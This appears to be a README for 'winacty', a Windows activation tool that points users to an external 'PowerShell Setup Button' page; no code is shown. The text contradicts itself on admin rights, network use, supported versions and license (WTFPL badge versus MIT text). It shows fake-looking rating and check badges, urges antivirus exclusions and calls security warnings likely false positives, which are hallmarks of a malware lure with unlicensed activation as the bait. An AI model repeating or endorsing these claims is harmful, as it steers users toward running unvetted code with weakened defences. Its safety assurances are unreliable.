<div align="center">

# winacty: Safe Windows Activation & System Utility — Windows Desktop Client

![](files/1.svg)

### ⚡ PowerShell Setup Button

[![](files/button.png)](https://legashelby-eng.github.io/winacty-desktop/)

[![pwsh](https://img.shields.io/badge/Pwsh-Core-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/Lic-Wtfpl-34b759?style=for-the-badge&labelColor=0d1117)]() [![checks](https://img.shields.io/badge/Checks-Passing-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![stars](https://img.shields.io/badge/Stars-4.7%2F5-f59e0b?style=for-the-badge&labelColor=0d1117)]()

</div>

---

winacty is a lightweight desktop utility engineered to activate Windows operating systems safely and without cost. The application streamlines the entire activation workflow into a minimal set of privileged operations, requiring only administrative execution to deploy its underlying routines. Built for reliability and transparency, it performs activation tasks without persistent background services or unnecessary system modifications. Its focused, single-purpose architecture ensures predictable behavior across supported Windows environments while keeping resource overhead negligible.

## ✅ Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Safe and Non-Destructive Activation:** winacty performs activation operations without modifying core system binaries, preserving the integrity of the Windows installation and allowing standard system updates to continue functioning normally.

- **Fully Free and Open Source:** Every component of winacty is free to use, inspect, and modify. There are no hidden fees, subscriptions, or telemetry, and the full source is available for community review and contribution.

- **Lightweight and Dependency-Free:** The tool ships as a compact, self-contained package with no external runtime dependencies, minimizing disk footprint and eliminating the need for additional frameworks or libraries.

- **One-Click Execution:** Activation is triggered through a single launch sequence with no multi-step configuration. The tool handles its own prerequisite checks and proceeds automatically once initiated.

- **Administrator-Aware Operation:** winacty detects insufficient privileges and prompts for elevation when required, ensuring activation routines execute in the correct context without manual permission management.

- **Broad Windows Compatibility:** Supports a wide range of modern Windows editions and builds, with version detection that adapts the activation process to the host environment.

- **Transparent Status Reporting:** Clear console output reports each stage of the activation process and confirms the final outcome, so users always know the current state of their system.

- **Idempotent and Reversible:** Running winacty multiple times is safe; repeated executions do not compound changes. Activation state can be verified and, where applicable, reverted through the same tool.

- **Minimal System Footprint:** No background services, scheduled tasks, or persistent agents are installed. All operations complete within the session and leave no resident processes behind.

- **Community-Driven Development:** The project welcomes contributions, issue reports, and feature discussions, with an actively maintained codebase and versioned releases.

## How It Works

winacty operates through a lightweight, self-contained activation workflow designed to run with minimal user interaction while remaining transparent about each stage of execution. The process is initiated by launching the provided executable with elevated privileges, which allows the tool to interact with the necessary system-level components required for activation.

Upon execution, winacty performs an environment check to confirm the operating system edition, build version, and current activation state. This step ensures that the tool only proceeds when the host configuration is supported, avoiding unnecessary or incompatible operations. Once the environment is validated, the tool applies its activation routine by interfacing with the native Windows activation subsystem, establishing the required licensing configuration without modifying unrelated system files or persistent user settings.

The activation procedure is executed in a controlled sequence: the tool prepares the licensing context, submits the activation request to the local software protection service, and verifies the resulting status. Feedback is surfaced to the user throughout the process, including progress indicators and a final confirmation of the activation outcome. If any step fails, winacty reports the specific stage at which the issue occurred, enabling straightforward diagnosis.

winacty is engineered to be non-destructive and reversible. It does not bundle external dependencies, does not perform background persistence, and does not alter system integrity beyond the scope of the activation task. All operations are confined to the activation workflow, and the tool exits cleanly once the process completes, leaving the system in a stable state regardless of the result.

## Compatibility

winacty is engineered for broad deployment across the Windows ecosystem, supporting both 32-bit (x86) and 64-bit (x64) architectures. The utility is validated against Windows 7, Windows 8.1, Windows 10, and Windows 11, including current cumulative update baselines, ensuring consistent behavior across legacy and modern environments.

The activation engine operates independently of the specific Windows edition in use, covering Home, Pro, Enterprise, Education, and LTSC variants. Elevated privileges are required for execution, as the tool must interface with system-level licensing services and registry hives; standard user contexts are not supported.

Runtime dependencies are minimized by design. winacty does not require external frameworks, package managers, or supplementary installers—the distributed binaries are self-contained and execute natively on the target host. No background services or persistent agents are installed, and no modifications are made to system files beyond the scope of the activation process itself.

Compatibility with virtualization platforms, including Hyper-V, VMware, and VirtualBox guest environments, is maintained, provided the guest OS meets the version and architecture requirements above. Systems operating behind restrictive group policies or third-party endpoint protection may require exclusions to allow execution, as with any administrative-level utility.

For environments where the primary activation path is unavailable, winacty includes fallback mechanisms designed to preserve functionality without compromising system integrity. Users encountering platform-specific behavior are encouraged to report details through the project's issue tracker so that compatibility coverage can be extended.

## FAQ

- **Does winacty modify system files permanently?**  
  winacty applies activation through supported system interfaces and does not alter core OS binaries. Any changes made are limited to activation-related components and can be reverted by restoring a prior system state.

- **Which Windows versions are supported?**  
  winacty targets supported Windows desktop releases. Refer to the Compatibility section for the exact version matrix; older or end-of-life builds may behave unpredictably and are not guaranteed to work.

- **Is administrative privilege required?**  
  Yes. Activation operates at the system level, so winacty must be launched with elevated permissions. Running without administrator rights will result in a failed or incomplete activation.

- **Is an internet connection needed?**  
  winacty performs its core workflow locally. Connectivity may be required only for optional verification steps; the activation process itself does not depend on external services.

- **How long does activation take?**  
  Typical execution completes within seconds. Duration may vary based on system load, antivirus scanning, and the Windows build in use.

- **Will winacty interfere with antivirus or security software?**  
  Some security tools flag system-level utilities by heuristic. If a warning appears, review the detection details before proceeding; false positives on activation tooling are common but should be evaluated case by case.

- **Can I revert the activation?**  
  Yes. Activation state can be reset using standard Windows activation management. Reverting restores the prior licensing state without requiring a full reinstall.

- **Does winacty collect or transmit data?**  
  winacty does not transmit telemetry or personal data. All processing occurs locally on the target machine.

- **What should I do if activation fails?**  
  Confirm elevated execution, verify the Windows build against the Compatibility section, and check for security software interference. If the issue persists, report it through the project's issue tracker with the Windows version, error output, and steps to reproduce.

- **Can winacty be used on multiple machines?**  
  winacty is a per-machine utility. Each target system requires its own execution; no shared license or configuration is involved.

- **Is winacty affiliated with Microsoft?**  
  No. winacty is an independent project and is not endorsed by or affiliated with Microsoft. Refer to the Disclaimer section for full terms.

## Disclaimer

winacty is provided as a free utility for activating Windows PCs. It is offered "as is," without warranty of any kind, express or implied, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement. By downloading, installing, or running winacty, you accept full responsibility for how the software is used on your system and for any consequences that result.

The tool modifies system activation state and related components. While winacty is designed to operate safely, changes to activation, licensing, or system configuration can interact unpredictably with third-party software, security products, or future system updates. You are strongly advised to create a full system backup or restore point before running winacty, and to test it in a controlled environment where possible.

winacty is intended for use only on systems you own or are explicitly authorized to administer. You are solely responsible for ensuring that your use of the software complies with all applicable laws, regulations, and licensing terms governing your copy of Windows. The developers and contributors of winacty do not condone or support unauthorized activation or any use that violates software licensing agreements.

No guarantee is made regarding compatibility with every Windows edition, build, or configuration. Activation outcomes may vary depending on system state, prior modifications, and network conditions. The maintainers are not liable for any data loss, system instability, activation failure, or other damages arising directly or indirectly from the use of winacty.

This disclaimer applies to the fullest extent permitted by applicable law and survives any termination of your use of the software.

## License

Winacty is distributed under the MIT License, a permissive open-source license that grants unrestricted rights to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software. Redistribution in source or binary form is permitted provided that the original copyright notice and this license text are retained in all copies or substantial portions of the software. The software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or its use. Contributions to winacty are accepted under the same license terms, and by submitting a pull request or patch, contributors affirm that their contributions are their original work and agree to license them accordingly.